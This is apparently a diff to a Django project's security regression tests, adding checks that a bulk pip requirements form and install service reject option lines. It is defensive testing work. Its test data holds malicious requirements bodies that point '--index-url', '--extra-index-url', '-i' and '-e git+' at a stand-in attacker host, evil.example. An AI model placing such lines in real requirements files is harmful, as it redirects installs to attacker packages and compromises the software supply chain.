@@ -1,11 +1,12 @@
 """
-Security regression tests for the missing-authorization fixes in the
-2026-07-05 audit (docs/SECURITY_AUDIT_2026-07-05.md).
+Security regression tests for the 2026-07-05 audit
+(docs/SECURITY_AUDIT_2026-07-05.md): missing-authorization fixes (Vulns 3/4/5)
+and the bulk-requirements pip source-injection fix (Vuln 6).
 
-A plain authenticated **member** (non-superuser) must not be able to reach
-instance-global admin surfaces. The shared ``@superuser_required`` decorator
-sends non-superusers to the login page (302 redirect), so a denied request is a
-redirect to ``auth:login`` that performs no mutation.
+For the authz fixes, a plain authenticated **member** (non-superuser) must not be
+able to reach instance-global admin surfaces. The shared ``@superuser_required``
+decorator sends non-superusers to the login page (302 redirect), so a denied
+request is a redirect to ``auth:login`` that performs no mutation.
 """
 import uuid
 from unittest import mock
@@ -13,7 +14,9 @@ from unittest import mock
 from django.test import TestCase
 from django.urls import reverse
 
+from core.forms import BulkInstallForm
 from core.models import GlobalSettings, User
+from core.services import EnvironmentService
 
 
 def _mock_setup(test):
@@ -171,3 +174,53 @@ class LogsAuthzTests(TestCase):
         api = self.client.get(reverse("cpanel:logs_api"))
         self.assertEqual(api.status_code, 200)
         self.assertTrue(api.json()["success"])
+
+
+class BulkRequirementsInjectionTests(TestCase):
+    """Vuln 6 — bulk requirements must reject pip option lines (leading "-").
+
+    Skipping them (the old behaviour) let a body like ``--index-url
+    https://evil/simple`` redirect installs to an attacker index, since pip
+    honours option lines inside a requirements file.
+    """
+
+    OPTION_LINES = [
+        "--index-url https://evil.example/simple\nrequests",
+        "--extra-index-url https://evil.example/simple\nrequests",
+        "-i https://evil.example/simple\nrequests",
+        "-e git+https://evil.example/pkg.git#egg=pkg",
+    ]
+
+    def test_form_rejects_option_lines(self):
+        for body in self.OPTION_LINES:
+            with self.subTest(body=body.splitlines()[0]):
+                form = BulkInstallForm(data={"requirements": body})
+                self.assertFalse(form.is_valid())
+                self.assertIn(
+                    "not allowed",
+                    " ".join(form.errors.get("__all__", [])).lower(),
+                )
+
+    def test_form_accepts_plain_requirements(self):
+        form = BulkInstallForm(data={"requirements": "requests==2.31.0\n# a comment\nflask"})
+        self.assertTrue(form.is_valid(), form.errors)
+
+    def test_service_rejects_option_lines_before_running_pip(self):
+        """Defense in depth: install_requirements refuses an option line without
+        ever invoking pip."""
+        env = mock.Mock()
+        env.get_pip_executable.return_value = "/fake/pip"
+        env.name = "test-env"
+
+        with mock.patch(
+            "core.services.environment_service.os.path.isfile", return_value=True
+        ), mock.patch(
+            "core.services.environment_service.subprocess.run"
+        ) as run:
+            success, out, err = EnvironmentService.install_requirements(
+                env, "--index-url https://evil.example/simple\nrequests"
+            )
+
+        self.assertFalse(success)
+        self.assertIn("not allowed", err.lower())
+        run.assert_not_called()
